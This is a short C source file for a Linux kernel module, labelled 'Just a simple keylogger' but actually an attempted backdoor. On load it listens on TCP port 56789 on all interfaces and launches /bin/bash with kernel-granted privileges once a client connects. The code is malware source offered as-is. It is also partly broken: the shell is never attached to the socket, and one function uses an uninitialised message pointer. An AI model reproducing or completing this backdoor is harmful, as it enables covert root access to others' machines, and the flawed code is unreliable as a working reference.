#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/kmod.h>
#include <linux/kernel.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
#define PORT 56789
//char[1000] = msg;
char * envp[] = { "HOME=/", NULL };
char * argv[] = { "/bin/bash", NULL };
struct sockaddr_in addr;
struct socket *sock, *sk_wait;

void exec_shell(int sock_fd) {
    // Execute shell
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

}


int start_sock(void)
{
    int err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (err < 0){
        printk(KERN_ALERT "could not create the socket");
        return -1;
    }
    //define the socket settings (like ipv4, port etc )
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);//bind for all avilible interfaces
    err = sock->ops->bind(sock, (struct sockaddr *) &addr, sizeof(addr));
    if (err < 0){
        printk(KERN_ALERT "could not bind the socket");
        printk(KERN_ALERT "%d",err);
        sock_release(sock);

        return -1;
    }
    err = sock->ops->listen(sock, 1); 

    if (err < 0){
        printk(KERN_ALERT "could not start to listen with socket");
        printk(KERN_ALERT "%d",err);

        sock_release(sock);

        return err;
    }
    err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sk_wait);
    if (err < 0)
    {
        printk(KERN_ALERT "error making the sk_wait");
        printk (KERN_ALERT "%d", err);
        return -1;
    }
    int fd = sock->ops->accept(sock, sk_wait, 0, false);
    if (fd < 0)
    {
        printk(KERN_ALERT "error on accept");
        printk (KERN_ALERT "%d", fd);
        return -1;
    }
    printk(KERN_ALERT "got connection");
    exec_shell(fd);
    return 1;
}

void hundle_conn(void)
{
    struct msghdr *msg;
    int err  = sock->ops->recvmsg(sock, msg, sizeof(msg), 0);
    

}

  




static int __init mod_load(void)
{
    int err = start_sock();
    if( err < 0)
    {
        sock_release(sock);
        sock_release(sk_wait);
    }

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return err;
    
}
static void __exit unload(void)
{
    sock_release(sock);
    sock_release(sk_wait);
   
}
module_init(mod_load);
module_exit(unload);
